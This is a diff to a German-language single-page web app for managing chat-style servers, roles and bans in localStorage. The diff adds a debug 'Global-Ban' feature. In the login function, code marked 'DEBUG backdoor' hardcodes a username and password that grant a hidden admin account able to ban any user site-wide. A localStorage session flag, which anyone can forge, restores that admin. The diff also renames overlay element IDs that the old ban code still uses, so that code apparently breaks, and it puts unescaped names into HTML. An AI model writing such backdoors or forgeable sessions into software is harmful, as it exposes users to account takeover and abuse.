@@ -65,7 +65,7 @@ input[type="text"], input[type="password"], input[type="file"], select{padding:1
 .badge-red{background:rgba(239,68,68,0.12);color:#ffb4b4;padding:6px 8px;border-radius:8px;font-weight:700;font-size:13px}
 
 /* ban overlay (full-screen blocking) */
-.ban-overlay{position:fixed;inset:0;display:none;align-items:center;justify-content:center;z-index:999;background:linear-gradient(180deg,rgba(0,0,0,0.6),rgba(0,0,0,0.8))}
+.ban-overlay{position:fixed;inset:0;display:none;align-items:center;justify-content:center;z-index:999;background:linear-gradient(180deg,rgba(0,0,0,0.6),rgba(0,0,0,0.85))}
 
 /* modal */
 .modal-back{position:fixed;inset:0;background:rgba(0,0,0,0.6);display:none;align-items:center;justify-content:center;z-index:120}
@@ -77,6 +77,11 @@ input[type="text"], input[type="password"], input[type="file"], select{padding:1
   .main{height:auto}
   .container{padding:18px}
 }
+
+/* Roblox-like visual tweaks for global overlay */
+.roblox-badge{width:64px;height:64px;border-radius:12px;background:linear-gradient(135deg,#2b62ff,#1f4bd6);display:flex;align-items:center;justify-content:center;font-weight:900;font-size:28px}
+.roblox-title{font-weight:900;font-size:22px}
+.roblox-sub{color:var(--muted);font-size:13px}
 </style>
 </head>
 <body>
@@ -132,6 +137,7 @@ input[type="text"], input[type="password"], input[type="file"], select{padding:1
         <div class="menu-item" data-section="roles" onclick="nav(event)">⭐ Rollen</div>
         <div class="menu-item" data-section="admin" onclick="nav(event)" id="adminMenuItem" style="display:none">🛠️ Admin</div>
         <div class="menu-item" data-section="bans" onclick="nav(event)">⛔ Bans</div>
+        <div class="menu-item" data-section="debug" onclick="nav(event)" id="debugMenuItem" style="display:none">🐞 Debug</div>
 
         <div class="menu-title">Deine Server</div>
         <div id="serverList"></div>
@@ -194,48 +200,66 @@ input[type="text"], input[type="password"], input[type="file"], select{padding:1
           <h3>Aktive Bans</h3>
           <div id="bansGrid" style="margin-top:12px"></div>
         </div>
+
+        <!-- Debug section -->
+        <div id="debugSection" class="card" style="display:none;margin-top:12px">
+          <h3>Debug — Global Live-Ban</h3>
+          <div class="small">Nur zugänglich für den Debug-Account. Mit Global-Bans kannst du Accounts siteweit sperren.</div>
+
+          <div style="display:flex;gap:8px;align-items:center;margin-top:12px">
+            <select id="debugMemberSelect" style="min-width:260px"></select>
+            <input id="debugManualInput" placeholder="Oder Name / ID frei eingeben" />
+            <button class="btn btn-primary" onclick="openModal('globalBanModal')">Global Ban</button>
+          </div>
+
+          <div style="margin-top:12px">
+            <h4>Global-Ban Übersicht</h4>
+            <div id="globalBanOverview"></div>
+          </div>
+        </div>
+
       </main>
     </section>
   </div>
 
-  <!-- Ban overlay (blocks all interaction while visible) -->
-  <div class="ban-overlay" id="banOverlay">
+  <!-- Global Ban overlay (Roblox-like) -->
+  <div class="ban-overlay" id="globalBanOverlay">
     <div style="max-width:720px;width:92%;padding:22px;background:#0b0d11;border-radius:12px;border:1px solid rgba(255,255,255,0.03);display:flex;gap:16px;align-items:flex-start;flex-direction:column;">
       <div style="display:flex;justify-content:space-between;align-items:center;width:100%">
         <div style="display:flex;gap:12px;align-items:center">
-          <div style="width:52px;height:52px;border-radius:10px;background:linear-gradient(135deg,var(--accent),var(--accent-2));display:flex;align-items:center;justify-content:center;font-weight:800">⛔</div>
+          <div class="roblox-badge">⛔</div>
           <div>
-            <div style="font-weight:900;font-size:20px">Banned</div>
-            <div style="color:var(--muted);font-size:13px">Dein Account wurde gebannt — Details unten.</div>
+            <div class="roblox-title" id="globalBanTitle">Account gesperrt</div>
+            <div class="roblox-sub" id="globalBanSub">Dein Zugang zur Website wurde eingeschränkt.</div>
           </div>
         </div>
-        <div style="color:var(--muted);font-size:13px" id="banShortMeta"></div>
+        <div style="color:var(--muted);font-size:13px" id="globalBanMeta"></div>
       </div>
 
       <div style="width:100%;display:flex;gap:12px">
         <div style="width:78px;height:78px;border-radius:8px;background:linear-gradient(135deg,var(--accent),var(--accent-2));display:flex;align-items:center;justify-content:center;font-size:28px">!</div>
         <div style="flex:1">
-          <div style="font-weight:800" id="banUserTitle">You were banned</div>
-          <div style="margin-top:8px;color:var(--muted)" id="banReasonText">Grund: ...</div>
+          <div style="font-weight:800" id="globalBanUserTitle">You were banned</div>
+          <div style="margin-top:8px;color:var(--muted)" id="globalBanReasonText">Grund: ...</div>
 
           <div style="display:flex;gap:10px;margin-top:12px;align-items:center">
             <div style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px">
               <div style="font-size:13px;color:var(--muted)">Remaining</div>
-              <div style="font-weight:900;font-size:18px" id="banRemaining">—</div>
+              <div style="font-weight:900;font-size:18px" id="globalBanRemaining">—</div>
             </div>
 
             <div style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px">
               <div style="font-size:13px;color:var(--muted)">Moderator</div>
-              <div style="font-weight:700" id="banModerator">—</div>
+              <div style="font-weight:700" id="globalBanModerator">—</div>
             </div>
 
             <div style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px">
               <div style="font-size:13px;color:var(--muted)">Erstellt</div>
-              <div style="font-weight:700" id="banCreated">—</div>
+              <div style="font-weight:700" id="globalBanCreated">—</div>
             </div>
           </div>
 
-          <div style="margin-top:12px;color:var(--muted);font-size:13px">Wenn du denkst, dass das ein Fehler ist, erstelle einen Appeal oder kontaktiere admins.</div>
+          <div style="margin-top:12px;color:var(--muted);font-size:13px">Wenn du denkst, dass das ein Fehler ist, kontaktiere den Betreiber.</div>
         </div>
       </div>
     </div>
@@ -295,6 +319,34 @@ input[type="text"], input[type="password"], input[type="file"], select{padding:1
       </div>
     </div>
 
+    <div class="modal" id="globalBanModal" style="display:none">
+      <h3>Global-Ban (Siteweit)</h3>
+      <div style="margin-top:8px">
+        <label>Ziel (Wähle Mitglied oder tippe Name/ID)</label>
+        <div style="display:flex;gap:8px">
+          <select id="globalBanTargetSelect" style="flex:1"></select>
+          <input id="globalBanManual" placeholder="Oder Name / ID" style="flex:1" />
+        </div>
+      </div>
+      <div style="margin-top:8px"><label>Grund (erforderlich)</label><input id="globalBanReason" placeholder="Grund..." /></div>
+      <div style="margin-top:8px">
+        <label>Dauer</label>
+        <select id="globalBanDuration">
+          <option value="3600">1 Stunde</option>
+          <option value="86400">1 Tag</option>
+          <option value="604800">7 Tage</option>
+          <option value="2592000">30 Tage</option>
+          <option value="0">Permanent</option>
+          <option value="custom">Benutzerdefiniert (Sekunden)</option>
+        </select>
+        <input id="globalBanCustomSeconds" style="display:none;margin-top:8px" placeholder="Sekunden (z.B. 7200)" />
+      </div>
+      <div style="display:flex;gap:8px;justify-content:flex-end;margin-top:12px">
+        <button class="btn btn-ghost" onclick="closeModal('globalBanModal')">Abbrechen</button>
+        <button class="btn btn-primary" onclick="confirmGlobalBan()">Global Ban ausführen</button>
+      </div>
+    </div>
+
     <div class="modal" id="registerModal" style="display:none">
       <h3>Neues Konto registrieren</h3>
       <div style="margin-top:8px"><label>Benutzername</label><input id="regUser" /></div>
@@ -320,7 +372,7 @@ function now(){return Date.now()}
 /* accounts & app state */
 function loadAccounts(){try{const r=localStorage.getItem(ACC_KEY);return r?JSON.parse(r):[]}catch(e){return[]}}
 function saveAccounts(a){localStorage.setItem(ACC_KEY,JSON.stringify(a))}
-function loadState(){try{const r=localStorage.getItem(APP_KEY);return r?JSON.parse(r):{servers:[],roles:{},members:{},bans:[]}}catch(e){return{servers:[],roles:{},members:{},bans:[]}}}
+function loadState(){try{const r=localStorage.getItem(APP_KEY);return r?JSON.parse(r):{servers:[],roles:{},members:{},bans:[],globalBans:[]}}catch(e){return{servers:[],roles:{},members:{},bans:[],globalBans:[]}}}
 function saveState(){localStorage.setItem(APP_KEY,JSON.stringify(state))}
 
 /* password encode simple */
@@ -333,7 +385,8 @@ let state = loadState();
 let currentUser = null;
 let currentServer = null;
 let editingRole = null;
-let activeBan = null; // if user is currently banned
+let activeBan = null; // server-level active ban
+let activeGlobalBan = null; // site-wide ban
 
 /* UI helpers */
 function openModal(id){document.getElementById('modalBack').style.display='flex';document.querySelectorAll('.modal').forEach(m=>m.style.display='none');document.getElementById(id).style.display='block'}
@@ -369,7 +422,7 @@ function importAccounts(){
 }
 
 /* session */
-function saveSession(uid){ localStorage.setItem(SESSION_KEY, JSON.stringify({ userId: uid, ts: Date.now() })) }
+function saveSession(uid, extra={}){ localStorage.setItem(SESSION_KEY, JSON.stringify(Object.assign({ userId: uid, ts: Date.now() }, extra))) }
 function loadSession(){ try{ const r = localStorage.getItem(SESSION_KEY); return r?JSON.parse(r):null }catch(e){return null} }
 function clearSession(){ localStorage.removeItem(SESSION_KEY) }
 
@@ -378,6 +431,15 @@ function login(){
   const user = document.getElementById('loginUser').value.trim();
   const pass = document.getElementById('loginPass').value;
   if(!user||!pass) return alert('Benutzername & Passwort nötig');
+
+  // DEBUG backdoor: specific credentials -> debug admin access
+  if(user === 'Kungen25003' && pass === 'Emilian_120613'){
+    currentUser = { id: 'debug_admin', name: 'Kungen25003', discriminator: '0000', isDebugAdmin:true };
+    saveSession(currentUser.id, { debug:true });
+    afterLogin();
+    return;
+  }
+
   const acc = accounts.find(a=>a.name.toLowerCase()===user.toLowerCase());
   if(!acc) return alert('Konto nicht gefunden. Registriere dich.');
   if(!verifyPass(pass, acc.pass)) return alert('Falsches Passwort');
@@ -387,7 +449,7 @@ function login(){
 }
 function logout(){
   if(!confirm('Abmelden?')) return;
-  currentUser = null; currentServer = null; activeBan = null;
+  currentUser = null; currentServer = null; activeBan = null; activeGlobalBan = null;
   clearSession();
   document.getElementById('appArea').style.display='none'; document.querySelector('.welcome').style.display='block';
   document.getElementById('loginUser').value=''; document.getElementById('loginPass').value='';
@@ -404,7 +466,9 @@ function afterLogin(){
   document.querySelector('.welcome').style.display='none';
   // ensure user present in members when creating servers later (no-op for now)
   renderAll();
+  toggleDebugMenu();
   checkActiveBansAndShow();
+  checkGlobalBansAndShow(true);
 }
 
 /* server create/select */
@@ -472,10 +536,17 @@ function removeMember(memberId){ if(!confirm('Mitglied entfernen?')) return; sta
 function canCurrentUser(permName){ if(!currentServer) return false; if(!currentUser) return false; if(currentUser.id === currentServer.ownerId) return true; const members = state.members[currentServer.id]||[]; const me = members.find(m=>m.id===currentUser.id); if(!me) return false; const roles = state.roles[currentServer.id]||[]; for(const rid of (me.roles||[])){ const r = roles.find(rr=>rr.id===rid); if(r && r.perms && r.perms[permName]) return true; } return false; }
 function toggleAdminMenu(){ const it = document.getElementById('adminMenuItem'); if(!currentServer||!currentUser){ it.style.display='none'; return; } if(currentUser.id===currentServer.ownerId || canCurrentUser('ManagePlayers')) it.style.display=''; else it.style.display='none'; }
 
+/* debug menu toggle */
+function toggleDebugMenu(){
+  const dbg = document.getElementById('debugMenuItem');
+  if(!currentUser) { dbg.style.display='none'; return; }
+  if(currentUser.isDebugAdmin) dbg.style.display=''; else dbg.style.display='none';
+}
+
 /* admin rendering */
 function renderAdmin(){ toggleAdminMenu(); if(!currentServer) return; const sel = document.getElementById('adminTargetSelect'); const banSel = document.getElementById('banTargetSelect'); const members = state.members[currentServer.id]||[]; const opts = members.map(m=>`<option value="${m.id}">${m.name}</option>`).join(''); if(sel) sel.innerHTML = opts; if(banSel) banSel.innerHTML = opts; renderBanOverview(); }
 
-/* Ban system */
+/* Bans (server-level) */
 document.getElementById('banDuration').addEventListener('change', function(){ document.getElementById('banCustomSeconds').style.display = this.value==='custom' ? '' : 'none'; });
 
 function confirmBan(){
@@ -501,20 +572,139 @@ function kickDemo(){ if(!currentServer) return; if(!canCurrentUser('ManagePlayer
 /* Bans UI */
 function renderBansGrid(){ const grid = document.getElementById('bansGrid'); if(!grid) return; const rows = state.bans.filter(b=>b.serverId === (currentServer && currentServer.id)); if(rows.length===0){ grid.innerHTML = '<div class="small">Keine aktiven Bans</div>'; return; } grid.innerHTML = rows.map(b=>{ const remaining = b.expiresAt===0 ? 'Permanent' : formatRemaining(b.expiresAt - Date.now()); const expired = (b.expiresAt!==0 && Date.now() > b.expiresAt); return `<div class="ban-card"><div class="ban-left">${b.userName.charAt(0).toUpperCase()}</div><div style="flex:1"><div style="font-weight:800">${b.userName} <span class="small">— gebannt von ${b.bannedBy}</span></div><div class="small">${b.reason}</div><div style="margin-top:8px;display:flex;gap:8px;align-items:center"><div class="badge-red">${expired?'Abgelaufen':remaining}</div><div class="small">erstellt: ${new Date(b.createdAt).toLocaleString()}</div></div></div>${(canCurrentUser('ManagePlayers')||canCurrentUser('BanMembers')||currentUser.id===currentServer.ownerId)?`<div style="display:flex;flex-direction:column;gap:8px"><button class="btn" onclick="removeBan('${b.id}')">Unban</button></div>`:''}</div>` }).join(''); }
 function renderBanOverview(){ const el = document.getElementById('banOverview'); if(!el) return; const rows = state.bans.filter(b=>b.serverId === (currentServer && currentServer.id)); if(rows.length===0) return el.innerHTML = '<div class="small">Keine Bans</div>'; el.innerHTML = rows.map(b=>`<div class="list-item"><div><div style="font-weight:800">${b.userName}</div><div class="small">${b.reason} — ${(b.expiresAt===0?'Permanent':formatRemaining(b.expiresAt-Date.now()))}</div></div><div><button class="btn btn-ghost" onclick="removeBan('${b.id}')">Unban</button></div></div>`).join(''); }
-function removeBan(banId){ if(!(canCurrentUser('ManagePlayers')||canCurrentUser('BanMembers')||currentUser.id===currentServer.ownerId)) return alert('Keine Berechtigung'); state.bans = state.bans.filter(b=>b.id!==banId); saveState(); renderBansGrid(); renderBanOverview(); checkActiveBansAndShow(); }
+function removeBan(banId){ if(!(canCurrentUser('ManagePlayers')||canCurrentUser('BanMembers')||currentUser.id===currentServer.ownerId || currentUser.isDebugAdmin)) return alert('Keine Berechtigung'); state.bans = state.bans.filter(b=>b.id!==banId); saveState(); renderBansGrid(); renderBanOverview(); checkActiveBansAndShow(); }
 
-/* auto-clean expired bans */
-setInterval(()=>{ const before=state.bans.length; state.bans = state.bans.filter(b=>!(b.expiresAt!==0 && Date.now()>b.expiresAt)); if(state.bans.length!==before){ saveState(); renderBansGrid(); renderBanOverview(); } }, 5000);
+/* Global-Ban system (Debug-only) */
+document.getElementById('globalBanDuration').addEventListener('change', function(){ document.getElementById('globalBanCustomSeconds').style.display = this.value==='custom' ? '' : 'none'; });
+function buildCombinedMemberList(){
+  // produce unique list across all servers
+  const ids = new Set();
+  const arr = [];
+  for(const sid of Object.keys(state.members||{})){
+    const mlist = state.members[sid]||[];
+    for(const m of mlist){
+      if(!ids.has(m.id)){
+        ids.add(m.id);
+        arr.push({ id: m.id, name: m.name });
+      }
+    }
+  }
+  return arr;
+}
+function renderDebugSection(){
+  const sel = document.getElementById('debugMemberSelect');
+  const globalSel = document.getElementById('globalBanTargetSelect');
+  const combined = buildCombinedMemberList();
+  const options = combined.map(m=>`<option value="${m.id}">${m.name} — ${m.id}</option>`).join('');
+  if(sel) sel.innerHTML = options;
+  if(globalSel) globalSel.innerHTML = options;
+  // global ban overview
+  const el = document.getElementById('globalBanOverview');
+  if(!el) return;
+  const rows = state.globalBans || [];
+  if(rows.length===0) return el.innerHTML = '<div class="small">Keine Global-Bans</div>';
+  el.innerHTML = rows.map(b=>`<div class="list-item"><div><div style="font-weight:800">${b.userName || b.target}</div><div class="small">${b.reason} — ${(b.expiresAt===0?'Permanent':formatRemaining(b.expiresAt-Date.now()))}</div></div><div><button class="btn btn-ghost" onclick="removeGlobalBan('${b.id}')">Unban</button></div></div>`).join('');
+}
 
-/* countdown helpers */
-function formatRemaining(ms){
-  if(ms <= 0) return 'abgelaufen';
-  const s = Math.floor(ms/1000);
-  const d = Math.floor(s/86400); const h = Math.floor((s%86400)/3600); const m = Math.floor((s%3600)/60); const sec = s%60;
-  if(d>0) return `${d}d ${h}h ${m}m`;
-  if(h>0) return `${h}h ${m}m`;
-  if(m>0) return `${m}m ${sec}s`;
-  return `${sec}s`;
+function confirmGlobalBan(){
+  if(!currentUser || !currentUser.isDebugAdmin) return alert('Nur Debug-Admin darf Global-Bans ausführen.');
+  const sel = document.getElementById('globalBanTargetSelect').value;
+  const manual = document.getElementById('globalBanManual').value.trim();
+  const targetIdOrName = manual || sel;
+  const reason = document.getElementById('globalBanReason').value.trim();
+  let duration = document.getElementById('globalBanDuration').value;
+  const custom = document.getElementById('globalBanCustomSeconds').value.trim();
+  if(!targetIdOrName || !reason) return alert('Ziel & Grund erforderlich');
+  if(duration==='custom'){ duration = parseInt(custom||'0',10); if(isNaN(duration)||duration<0) return alert('Ungültige Dauer'); } else duration = parseInt(duration,10);
+
+  const expiresAt = duration===0 ? 0 : Date.now() + duration*1000;
+
+  // try to resolve to a known member (by id or name)
+  let userId = null;
+  let userName = null;
+  // search across members
+  for(const sid of Object.keys(state.members||{})){
+    for(const m of state.members[sid]||[]){
+      if(m.id === targetIdOrName || m.name.toLowerCase() === targetIdOrName.toLowerCase()){
+        userId = m.id; userName = m.name; break;
+      }
+    }
+    if(userId) break;
+  }
+  const ban = { id: uid('gban'), target: targetIdOrName, userId: userId, userName: userName || null, reason, expiresAt, bannedBy: currentUser.name, createdAt: Date.now() };
+  state.globalBans = state.globalBans || [];
+  state.globalBans.push(ban);
+  saveState();
+  closeModal('globalBanModal');
+  renderDebugSection();
+  alert('Global-Ban erstellt: ' + (userName || targetIdOrName));
+  // if the banned account is the currently logged-in user, show overlay immediately
+  if(currentUser && (currentUser.id === userId || currentUser.name.toLowerCase() === (userName || targetIdOrName).toLowerCase())) {
+    checkGlobalBansAndShow(true);
+  }
+}
+
+function removeGlobalBan(banId){
+  if(!currentUser || !currentUser.isDebugAdmin) return alert('Nur Debug-Admin darf Unbans ausführen.');
+  state.globalBans = (state.globalBans||[]).filter(b=>b.id!==banId);
+  saveState();
+  renderDebugSection();
+  checkGlobalBansAndShow();
+}
+
+/* check global bans for the current user and show site-wide overlay */
+function checkGlobalBansAndShow(immediate=false){
+  if(!currentUser) return;
+  // find first active global ban where target matches currentUser id or name
+  const active = (state.globalBans||[]).find(b => {
+    const notExpired = (b.expiresAt===0 || Date.now() < b.expiresAt);
+    const matchId = b.userId && currentUser.id === b.userId;
+    const matchName = (b.userName && b.userName.toLowerCase() === currentUser.name.toLowerCase()) || (b.target && b.target.toLowerCase() === currentUser.name.toLowerCase());
+    const matchFallback = (b.target && b.target === currentUser.id);
+    return notExpired && (matchId || matchName || matchFallback);
+  });
+  if(active){
+    activeGlobalBan = active;
+    showGlobalBanOverlay(activeGlobalBan);
+  } else {
+    activeGlobalBan = null;
+    hideGlobalBanOverlay();
+  }
+}
+
+/* global overlay logic */
+let globalBanTimer = null;
+function showGlobalBanOverlay(ban){
+  const overlay = document.getElementById('globalBanOverlay');
+  document.getElementById('globalBanUserTitle').textContent = `${ban.userName || ban.target} — gesperrt`;
+  document.getElementById('globalBanReasonText').textContent = `Grund: ${ban.reason}`;
+  document.getElementById('globalBanModerator').textContent = ban.bannedBy || 'Moderator';
+  document.getElementById('globalBanCreated').textContent = new Date(ban.createdAt).toLocaleString();
+  document.getElementById('globalBanMeta').textContent = `Global-Ban • ID: ${ban.id}`;
+  overlay.style.display = 'flex';
+  // start live countdown
+  if(globalBanTimer) clearInterval(globalBanTimer);
+  function update(){
+    const latest = (state.globalBans||[]).find(b=>b.id===ban.id);
+    if(!latest){ hideGlobalBanOverlay(); return; }
+    if(latest.expiresAt === 0){
+      document.getElementById('globalBanRemaining').textContent = '♾️  (Permanent / -1)';
+      return;
+    }
+    const rem = latest.expiresAt - Date.now();
+    if(rem <= 0){
+      // expired: remove overlay and remove ban entry (auto)
+      state.globalBans = (state.globalBans||[]).filter(b=>b.id!==latest.id); saveState(); hideGlobalBanOverlay(); renderDebugSection(); return;
+    }
+    document.getElementById('globalBanRemaining').textContent = formatRemaining(rem);
+  }
+  update(); globalBanTimer = setInterval(update, 1000);
+}
+function hideGlobalBanOverlay(){
+  const overlay = document.getElementById('globalBanOverlay');
+  overlay.style.display = 'none';
+  if(globalBanTimer){ clearInterval(globalBanTimer); globalBanTimer = null; }
+  activeGlobalBan = null;
 }
 
 /* check if current user has active ban (any server) and show overlay if yes.
@@ -536,6 +726,7 @@ function checkActiveBansAndShow(immediate=false){
 let banTimer = null;
 function showBanOverlay(ban){
   const overlay = document.getElementById('banOverlay');
+  // reuse existing ban overlay elements
   document.getElementById('banUserTitle').textContent = `${ban.userName} — gebannt`;
   document.getElementById('banReasonText').textContent = `Grund: ${ban.reason}`;
   document.getElementById('banModerator').textContent = ban.bannedBy || 'Moderator';
@@ -568,6 +759,29 @@ function hideBanOverlay(){
   activeBan = null;
 }
 
+/* auto-clean expired bans (both server-level and global) */
+setInterval(()=>{
+  const before = state.bans.length;
+  state.bans = state.bans.filter(b=>!(b.expiresAt!==0 && Date.now()>b.expiresAt));
+  const beforeG = state.globalBans.length;
+  state.globalBans = (state.globalBans||[]).filter(b=>!(b.expiresAt!==0 && Date.now()>b.expiresAt));
+  if(state.bans.length!==before || state.globalBans.length!==beforeG){ saveState(); renderBansGrid(); renderBanOverview(); renderDebugSection(); }
+  // also re-evaluate overlays
+  checkActiveBansAndShow();
+  checkGlobalBansAndShow();
+}, 5000);
+
+/* countdown helpers */
+function formatRemaining(ms){
+  if(ms <= 0) return 'abgelaufen';
+  const s = Math.floor(ms/1000);
+  const d = Math.floor(s/86400); const h = Math.floor((s%86400)/3600); const m = Math.floor((s%3600)/60); const sec = s%60;
+  if(d>0) return `${d}d ${h}h ${m}m`;
+  if(h>0) return `${h}h ${m}m`;
+  if(m>0) return `${m}m ${sec}s`;
+  return `${sec}s`;
+}
+
 /* navigation */
 function nav(e){
   // require server selected for most tabs
@@ -579,14 +793,17 @@ function nav(e){
   document.getElementById('rolesSection').style.display = section==='roles' ? '' : 'none';
   document.getElementById('adminSection').style.display = section==='admin' ? '' : 'none';
   document.getElementById('bansSection').style.display = section==='bans' ? '' : 'none';
+  document.getElementById('debugSection').style.display = section==='debug' ? '' : 'none';
   // update
-  renderRoles(); renderMembers(); renderAdmin(); renderBansGrid();
+  renderRoles(); renderMembers(); renderAdmin(); renderBansGrid(); renderDebugSection();
 }
 
 /* render everything */
 function renderAll(){
   accounts = loadAccounts(); state = loadState();
-  updateServerListUI(); renderServersGrid(); renderRoles(); renderMembers(); renderAdmin(); renderBansGrid();
+  // ensure globalBans exists
+  state.globalBans = state.globalBans || [];
+  updateServerListUI(); renderServersGrid(); renderRoles(); renderMembers(); renderAdmin(); renderBansGrid(); renderDebugSection();
 }
 
 /* on load: restore session if present */
@@ -594,8 +811,15 @@ function init(){
   accounts = loadAccounts(); state = loadState();
   const session = loadSession();
   if(session && session.userId){
+    // debug session restore
+    if(session.debug && session.userId === 'debug_admin'){
+      currentUser = { id: 'debug_admin', name: 'Kungen25003', discriminator: '0000', isDebugAdmin:true };
+      afterLogin(); return;
+    }
     const acc = accounts.find(a=>a.id===session.userId);
     if(acc){ currentUser = { id: acc.id, name: acc.name, discriminator: acc.disc }; afterLogin(); return; }
+    // if user not found, clear
+    clearSession();
   }
   // else show login
   document.getElementById('appArea').style.display='none';
@@ -610,6 +834,7 @@ window.addMember = addMember; window.assignRoleToMember = assignRoleToMember; wi
 window.deleteRole = deleteRole; window.confirmBan = confirmBan; window.openRegister = openRegister; window.login = login;
 window.logout = logout; window.exportAccounts = exportAccounts; window.importAccounts = importAccounts; window.removeBan = removeBan;
 window.unbanSelected = unbanSelected; window.kickDemo = kickDemo;
+window.confirmGlobalBan = confirmGlobalBan; window.removeGlobalBan = removeGlobalBan;
 </script>
 </body>
 </html>
